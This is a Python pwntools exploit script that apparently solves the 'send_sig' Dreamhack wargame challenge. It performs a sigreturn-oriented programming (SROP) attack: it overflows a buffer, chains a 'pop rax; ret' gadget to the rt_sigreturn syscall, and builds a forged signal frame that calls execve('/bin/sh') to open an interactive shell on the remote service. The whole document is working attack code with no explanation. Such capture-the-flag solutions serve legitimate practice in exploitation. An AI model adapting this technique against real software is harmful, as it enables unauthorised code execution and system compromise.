from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('/home/send_sig/send_sig')
else:
    r = remote('host1.dreamhack.games', 16223)

pop_rax = 0x4010ae  # pop rax; ret
syscall = 0x4010b0  # syscall; ret
binsh = 0x402000  # "/bin/sh"

payload = b'a' * 0x10  # dummy
payload += p64(pop_rax)
payload += p64(0xf)  # syscall number of rt_sigreturn
payload += p64(syscall)

# execve("/bin/sh", 0, 0)
frame = SigreturnFrame()
frame.rax = 0x3b  # syscall number of execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload += bytes(frame)

r.sendafter('Signal:', payload)

r.interactive()